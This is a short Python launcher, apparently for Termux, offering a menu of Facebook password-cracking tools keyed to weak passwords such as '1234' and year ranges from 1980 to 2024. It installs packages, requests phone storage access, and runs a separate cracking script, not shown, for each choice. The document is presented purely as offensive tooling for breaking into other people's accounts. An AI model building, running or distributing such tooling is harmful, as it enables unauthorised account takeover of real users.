import os
import sys
import time
import requests
os.system("pip install rich")
os.system("pip install requests")
os.system("termux-setup-storage -y")
os.system("termux-setup-storage")
print ("\033[1;31m[01] Tool facebook pass 1234 - All ")
print("All pass 1234 ")
print ("")
print ("\033[1;37m[02] Tool facebook pass 1980 - 1990 ")
print("All pass 1980 - 1990 ")
print ("")
print ("")
print ("\033[1;37m[03] Tool facebook pass 1990 - 2000 ")
print("All pass 1990 - 2000 ")
print ("")
print ("\033[1;34m[04] Tool facebook pass 2000 - 2024  ")
print("All pass 2000 - 2024 ")
print ("")
print ("  \033[1;31m          1 , 2 , 3 , 4 ")
saw = input (' \033[1;37mCHOICE : ')
if saw in ['1','01']:
	os.system('python SAW-1234.os')
elif saw in ['2','02']:
	os.system('python SAW-1980.os')
elif saw in ['3','03']:
	os.system('python SAW-1990.os')
elif saw in ['4','04']:
	os.system('python SAW-2000.os')